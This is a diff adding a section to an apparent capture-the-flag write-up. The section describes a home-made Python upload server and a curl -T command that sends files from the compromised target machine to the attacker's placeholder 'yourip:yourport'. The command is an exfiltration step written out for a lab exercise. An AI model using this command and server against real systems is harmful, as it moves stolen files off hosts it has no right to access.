@@ -42,4 +42,57 @@ cat hostc/Users/Administrator/Desktop/root.txt
 ```
 This gives root.
 
+## Interesting Tidbit
+
+For this machine, I needed a way to upload files back onto my vm, since I didn't really have any tools to do so. While you can use existing tools, I thought it'd be fun to code this simple server up. 
+
+To upload a file from the target vm to your vm all you have to do is
+
+```bash
+curl -T filename http://yourip:yourport
+```
+
+Source code:
+
+```python
+#!/usr/bin/env python3
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import os
+
+UPLOAD_DIR = "uploads"
+
+class UploadHandler(BaseHTTPRequestHandler):
+    def do_PUT(self):
+        self.save_file()
+
+    def do_POST(self):
+        self.save_file()
+
+    def save_file(self):
+        os.makedirs(UPLOAD_DIR, exist_ok=True)
+
+        length = int(self.headers.get('Content-Length', 0))
+        filename = os.path.basename(self.path)
+        if not filename:
+            filename = "upload.bin"
+
+        filepath = os.path.join(UPLOAD_DIR, filename)
+
+        with open(filepath, "wb") as f:
+            f.write(self.rfile.read(length))
+
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"OK\n")
+
+    def log_message(self, format, *args):
+        return  # silence logs
+
+
+if __name__ == "__main__":
+    server = HTTPServer(("0.0.0.0", 8000), UploadHandler)
+    print("Upload server listening on port 8000...")
+    server.serve_forever()
+```
+
 Happy Hacking :)
